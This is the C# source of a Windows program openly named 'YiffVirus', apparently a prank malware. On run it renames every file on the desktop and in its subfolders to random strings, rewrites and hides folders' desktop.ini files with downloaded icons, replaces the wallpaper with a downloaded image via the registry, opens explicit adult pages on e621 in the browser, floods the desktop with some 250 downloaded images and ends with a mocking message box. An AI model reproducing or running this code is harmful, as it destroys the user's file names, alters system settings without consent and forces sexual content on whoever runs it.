using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace YiffVirus
{
    class Program
    {
        private static YiffDownloader yiffDownloader = new YiffDownloader();
        private static readonly string[] owoWords = { "OwO_Whats_This_", "Hewwo_", "OwO_notices_your_bulge_", "MERP_MERP_", "OwO_UwURawr_X3_" };
        private static readonly Random random = new Random();

        static void Main(string[] args)
        {
            Thread.Sleep(500);
            
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            // First we change the icons of the files in folders, so its a *bit* hidden
            foreach (string folder in Directory.GetDirectories(desktopPath))
            {
                ChangeFolderIcon(folder);
                foreach (string file in Directory.GetFiles(folder))
                {
                    if(!ChangeFileName(file))
                    {
                        continue;
                    } 
                }
            }

            // Then change the icons for the files that will be visible on the desktop
            foreach(string file in Directory.GetFiles(desktopPath))
            {
                if (!ChangeFileName(file))
                {
                    continue;
                }
            }
            
            
            using Image img = Image.FromStream(new System.Net.WebClient().OpenRead(yiffDownloader.downloadYiff(null, false)));
            string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
            img.Save(tempPath, System.Drawing.Imaging.ImageFormat.Bmp);

            // Set the wallpaper style to stretch
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue(@"WallpaperStyle", 2.ToString());
            key.SetValue(@"TileWallpaper", 0.ToString());
            // Set the desktop wallpaper
            SystemParametersInfo(20, 0, tempPath, 0x01 | 0x02);
            
            // Fill the desktop with MORE... MOOOOREEE!!
            for(int god = 0; god <= 250; god++)
            {
                switch(god)
                {
                    case 1:
                        // Pizza pic, by K1le
                        Process.Start("explorer.exe", "https://cdn.discordapp.com/attachments/882365636158836777/882383215141220423/3132693.png");
                        break;
                    case 2:
                        // h0rs3
                        Process.Start("explorer.exe", "https://e621.net/posts/2808711");
                        break;
                    case 3:
                        // Pache riggs
                        Process.Start("explorer.exe", "https://e621.net/posts/2401425");
                        break;
                    case 5:
                        // Sea salt
                        Process.Start("explorer.exe", "https://e621.net/posts/2039476");
                        break;
                    default:
                        break;
                }
                // You can probably modify this to make it a bit faster, WebExceptions happen if too fast though
                Thread.Sleep(500);
                new Thread(() =>
                {
                    yiffDownloader.downloadYiff(desktopPath, false);
                }).Start();

                if (god == 250)
                {
                    break;
                }
            }

            // 64 = MB_ICONINFORMATION
            // More Info: https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox
            MessageBox((IntPtr)0, "I worked really hard to make your desktop very *cool*\nI hope you like the art :3", $"Hewwo {Environment.UserName}!!", 64);
        }

        private static bool ChangeFileName(string file)
        {
            try
            {
                FileInfo fileInfo = new FileInfo(file);
                if (fileInfo.Name.Contains("desktop") || fileInfo.Extension.Contains("ico") || fileInfo.Extension.Contains("ini"))
                {
                    // Skip these, if we rename them, the folder will loose its very cool icon!
                    return false;
                }
                string newFile = file.Replace(fileInfo.Name, owoWords[random.Next(owoWords.Length)] + RandomString() + fileInfo.Extension);
                File.Move(file, newFile);
                Console.WriteLine($"[FILE] Changed name: {fileInfo.Name} -> {new FileInfo(newFile).Name}");
                return true;
            } catch(Exception)
            {
                return false;
            }
        }

        private static void ChangeFolderIcon(string folder)
        {
            string newIconName = yiffDownloader.downloadYiff(folder, true);
            string iniFilePath = folder + @"\desktop.ini";
            string newFolderIcon = $"{folder}\\{newIconName}.ico";
            WritePrivateProfileString(".ShellClassInfo", "IconFile", newFolderIcon, iniFilePath);
            WritePrivateProfileString(".ShellClassInfo", "IconIndex", "0", iniFilePath);
            WritePrivateProfileString(".ShellClassInfo", "IconResource", $"{newFolderIcon},0", iniFilePath);
            // ------------------
            WritePrivateProfileString("ViewState", "Mode", "", iniFilePath);
            WritePrivateProfileString("ViewState", "Vid", "", iniFilePath);
            WritePrivateProfileString("ViewState", "FolderType", "Pictures", iniFilePath);

            File.SetAttributes(iniFilePath, FileAttributes.System | FileAttributes.Archive | FileAttributes.Hidden);
            Console.WriteLine($"[FOLDER] Changed icon: {folder}.");
        }

        private static string RandomString()
        {
            var builder = new StringBuilder(6);

            char offset = 'a';
            const int lettersOffset = 26;

            for (var i = 0; i < 6; i++)
            {
                var @char = (char)random.Next(offset, offset + lettersOffset);
                builder.Append(@char);
            }

            return builder.ToString();
        }

        [DllImport("User32.dll", CharSet = CharSet.Unicode)]
        public static extern int MessageBox(IntPtr h, string message, string title, int type);

        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        [DllImport("KERNEL32.DLL", EntryPoint = "WritePrivateProfileStringW",
           SetLastError = true,
           CharSet = CharSet.Unicode, ExactSpelling = true,
           CallingConvention = CallingConvention.StdCall)]
        private static extern int WritePrivateProfileString(string lpAppName, string lpKeyName, string lpString, string lpFilename);
    }
}
